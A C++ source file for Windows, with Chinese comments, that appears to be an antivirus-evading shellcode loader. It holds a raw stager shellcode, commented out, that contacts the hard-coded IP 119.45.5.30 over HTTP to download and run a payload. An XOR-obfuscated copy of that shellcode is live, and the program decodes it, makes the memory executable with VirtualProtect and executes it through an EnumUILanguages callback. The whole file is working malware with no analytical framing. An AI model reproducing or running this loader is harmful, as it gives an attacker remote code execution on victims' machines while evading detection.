#include <stdio.h>
#include "Windows.h"
#include<iostream>

int main()
{
	/* length: 890 bytes */
	//原生ShellCode
	//unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x9a\x1f\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x64\x44\x69\x4c\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x53\x45\x4d\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x31\x39\x2e\x34\x35\x2e\x35\x2e\x33\x30\x00\x00\x00\x00\x00";
	//xor后的ShellCode
	unsigned char buf[]="\xff\x4b\x82\xe7\xf3\xeb\xcb\x3\x3\x3\x44\x54\x44\x53\x51\x54\x55\x4b\x34\xd1\x68\x4b\x8a\x51\x63\x4b\x8a\x51\x1b\x4b\x8a\x51\x23\x4b\x8a\x71\x53\x4b\xe\xb6\x49\x49\x50\x34\xcc\x4b\x34\xc3\xaf\x3f\x64\x7f\x1\x2f\x23\x44\xc4\xcc\x10\x44\x4\xc4\xe1\xf0\x51\x44\x54\x4b\x8a\x51\x23\x8a\x41\x3f\x4b\x4\xd3\x65\x84\x7b\x1b\xa\x1\x78\x71\x8a\x83\x8b\x3\x3\x3\x4b\x88\xc3\x77\x66\x4b\x4\xd3\x53\x8a\x4b\x1b\x47\x8a\x43\x23\x4c\x4\xd3\xe2\x55\x4b\xfe\xcc\x44\x8a\x37\x8b\x4b\x4\xd5\x50\x34\xcc\x4b\x34\xc3\xaf\x44\xc4\xcc\x10\x44\x4\xc4\x3b\xe3\x78\xf4\x4f\x2\x4f\x27\xb\x48\x3c\xd4\x78\xdb\x5b\x47\x8a\x43\x27\x4c\x4\xd3\x65\x44\x8a\xf\x4b\x47\x8a\x43\x1f\x4c\x4\xd3\x44\x8a\x7\x8b\x4b\x4\xd3\x44\x5b\x44\x5b\x5d\x5c\x59\x44\x5b\x44\x5c\x44\x59\x4b\x82\xef\x23\x44\x51\xfe\xe3\x5b\x44\x5c\x59\x4b\x8a\x11\xec\x4e\xfe\xfe\xfe\x60\x69\x3\x4c\xbd\x76\x6c\x6d\x6c\x6d\x68\x77\x3\x44\x55\x4c\x8c\xe5\x4f\x8c\xf4\x44\xb9\x4f\x76\x25\x6\xfe\xd8\x4b\x34\xcc\x4b\x34\xd1\x50\x34\xc3\x50\x34\xcc\x44\x53\x44\x53\x44\xb9\x39\x55\x7c\xa6\xfe\xd8\xea\x72\x59\x4b\x8c\xc4\x44\xbb\x99\x1e\x3\x3\x50\x34\xcc\x44\x54\x44\x54\x69\x2\x44\x54\x44\xb9\x56\x8c\x9e\xc5\xfe\xd8\xea\x5c\x5a\x4b\x8c\xc4\x4b\x34\xd1\x4c\x8c\xdb\x50\x34\xcc\x51\x6b\x3\x1\x43\x87\x51\x51\x44\xb9\xea\x58\x2d\x3a\xfe\xd8\x4b\x8c\xc5\x4b\x82\xc2\x53\x69\x9\x5e\x4b\x8c\xf4\x4b\x8c\xd9\x4c\xc6\xc3\xfe\xfe\xfe\xfe\x50\x34\xcc\x51\x51\x44\xb9\x30\x5\x1b\x7a\xfe\xd8\x88\xc3\xe\x88\xa0\x4\x3\x3\x4b\xfe\xce\xe\x87\x8f\x4\x3\x3\xea\xd2\xec\xe7\x4\x3\x3\xeb\xa1\xfe\xfe\xfe\x2e\x67\x47\x6c\x4f\x3\x38\x4e\x24\x53\x28\x43\x44\x53\x5a\x37\x5f\x53\x59\x5b\x38\x37\x2b\x53\x5d\x2c\x36\x42\x42\x2c\x36\x80\x27\x48\x4c\x42\x44\x51\x30\x52\x57\x44\x4d\x47\x44\x51\x47\x30\x44\x4d\x57\x4c\x55\x4c\x51\x58\x52\x30\x57\x48\x52\x57\x30\x45\x4c\x4f\x48\x24\x27\x4b\x2a\x4b\x29\x3\x38\x4e\x24\x53\x28\x3\x58\x72\x68\x71\x30\x44\x66\x68\x6d\x77\x39\x23\x50\x6e\x79\x6c\x6f\x6f\x64\x2e\x38\x2d\x33\x23\x2b\x62\x6e\x70\x73\x64\x77\x6c\x61\x6f\x68\x3a\x23\x50\x52\x4c\x48\x23\x3c\x2d\x33\x3a\x23\x56\x6c\x6d\x67\x6e\x76\x72\x23\x4d\x57\x23\x35\x2d\x34\x3a\x23\x56\x4e\x56\x35\x37\x3a\x23\x57\x71\x6c\x67\x68\x6d\x77\x2e\x38\x2d\x33\x3a\x23\x41\x4e\x4c\x48\x3c\x3a\x48\x4d\x58\x52\x52\x48\x50\x2c\x10\x9\x3\x38\x4e\x24\x53\x28\x43\x44\x53\x5a\x37\x5f\x53\x59\x5b\x38\x37\x2b\x53\x5d\x2c\x36\x42\x42\x2c\x36\x80\x27\x48\x4c\x42\x44\x51\x30\x52\x57\x44\x4d\x47\x44\x51\x47\x30\x44\x4d\x57\x4c\x55\x4c\x51\x58\x52\x30\x57\x48\x52\x57\x30\x45\x4c\x4f\x48\x24\x27\x4b\x2a\x4b\x29\x3\x38\x4e\x24\x53\x28\x43\x44\x53\x5a\x37\x5f\x53\x59\x5b\x38\x37\x2b\x53\x5d\x2c\x36\x42\x42\x2c\x36\x80\x27\x48\x4c\x42\x44\x51\x30\x52\x57\x44\x4d\x47\x44\x51\x47\x30\x44\x4d\x57\x4c\x55\x4c\x51\x58\x52\x30\x57\x48\x52\x57\x30\x45\x4c\x4f\x48\x24\x27\x4b\x2a\x4b\x29\x3\x38\x4e\x24\x53\x28\x43\x44\x53\x5a\x37\x5f\x53\x59\x5b\x38\x37\x2b\x53\x5d\x2c\x36\x42\x42\x2c\x36\x80\x27\x48\x4c\x42\x44\x51\x30\x52\x57\x44\x4d\x47\x44\x51\x47\x30\x44\x4d\x57\x4c\x55\x4c\x51\x58\x52\x30\x57\x48\x52\x57\x30\x45\x4c\x4f\x48\x24\x27\x4b\x2a\x4b\x29\x3\x44\xbd\xf3\xb8\xa1\x55\xfe\xd8\x4b\x34\xcc\xb9\x3\x3\x43\x3\x44\xbb\x3\x13\x3\x3\x44\xbc\x43\x3\x3\x3\x44\xb9\x5b\xa7\x52\xe8\xfe\xd8\x4b\x92\x52\x52\x4b\x8c\xe6\x4b\x8c\xf4\x4b\x8c\xd9\x44\xbb\x3\x23\x3\x3\x4c\x8c\xfc\x44\xb9\x11\x95\x8c\xe1\xfe\xd8\x4b\x82\xc7\x23\x88\xc3\x77\xb5\x65\x8a\x6\x4b\x4\xc2\x88\xc3\x78\xd6\x5b\x5b\x5b\x4b\x8\x3\x3\x3\x3\x53\xc2\xeb\x9e\x0\xfe\xfe\x34\x34\x3c\x2d\x37\x38\x2d\x38\x2d\x32\x33\x3\x3\x3\x3\x3";


	int password = 1026;

	int nLen = sizeof(buf) - 1;
	for (int i = 0; i < nLen; i++)
	{
		buf[i]--;

		buf[i] = buf[i] ^ password;

		//printf("\\x%x",buf[i]);
	}
	
	DWORD dwOldPro = 0;
	BOOL ifExec = VirtualProtect(buf,1024,PAGE_EXECUTE_READWRITE,&dwOldPro);
	EnumUILanguages((UILANGUAGE_ENUMPROC)&buf,0,0);

	return 0;
}